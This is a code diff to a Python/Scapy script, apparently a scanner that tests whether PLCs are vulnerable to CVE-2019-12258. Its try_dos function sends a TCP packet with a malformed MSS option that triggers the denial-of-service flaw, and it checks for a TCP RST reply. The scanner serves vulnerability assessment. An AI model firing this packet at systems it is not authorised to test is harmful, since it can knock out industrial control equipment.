@@ -71,8 +71,10 @@ class CveTester(object):
 		return s
 
 	# try to execute DoS using CVE-12258
-	def try_dos(self, dst_ip, dst_port, src_port, interface):
-		tcp_pkt = (Ether() / IP(dst=dst_ip) / TCP(dport=dst_port, sport=src_port))
+	def try_dos(self, sock, interface):
+		src_ip, src_port = sock.getsockname()
+		dst_ip, dst_port = sock.getpeername()
+		tcp_pkt = (Ether() / IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port))
 		tcp_pkt['TCP'].options = [('MSS', '\x00')]
 		if self.verbose == VERBOSE_HIGH:
 			return srp(tcp_pkt, iface=interface, timeout=2)
@@ -89,14 +91,12 @@ class CveTester(object):
 				print('error: failed to get the correct interface for the host {}'.format(ip))
 				return False
 
-		src_port = s.getsockname()[1]
-
-		out = self.try_dos(ip, tcp_port, src_port, interface)
+		out = self.try_dos(s, interface)
 		try:
-			answers = out[0]
-			res = answers[0]
-			packet = res[1]
-			tcp = packet[2]
+			answers = out[0]  # get the answers
+			res = answers[0]  # results list from the answers
+			res_packet = res[1]  # the packet we want to check
+			tcp = res_packet[TCP]  # tcp layer
 			if tcp.flags & TCP_RST_FLAG == TCP_RST_FLAG:  # check whether TCP RST flag is on
 				return True
 		except (IndexError, TypeError):  # returned packet is not what we expected
@@ -126,14 +126,13 @@ class CveTester(object):
 
 
 def main():
-	print(sys.version_info[0])
 	if sys.version_info[0] < 3:
 		raise Exception("Python 3 or a more recent version is required.")
 	parser = argparse.ArgumentParser(description="script for testing whether PLCs are vulnerable to  CVE-2019-12258")
 	parser.add_argument('-ip', '--ip', help='IP to test, or start of ip range', required=True)
 	port_group = parser.add_mutually_exclusive_group(required=True)
-	port_group.add_argument('-p', '--port', help='port to use.'.format(', '.join([str(port) for port in DEFAULT_PORTS])), type=int)
-	port_group.add_argument('-d', '--default_ports', help='check all the default ports:  {}'.format(', '.join([str(port) for port in DEFAULT_PORTS])), type=bool)
+	port_group.add_argument('-p', '--port', help='port to use.', type=int)
+	port_group.add_argument('-d', '--default_ports', help='check all the default ports:  {}'.format(', '.join([str(port) for port in DEFAULT_PORTS])), action='store_true')
 	parser.add_argument('-end_ip', '--end_ip', help='end of the ip range to test', required=False)
 	parser.add_argument('-i', '--iface', help='name of the network interface to use', required=False)
 	parser.add_argument('-v', '--verbose', type=int, help='verbose level: 0 to print only vulnerable devices,'
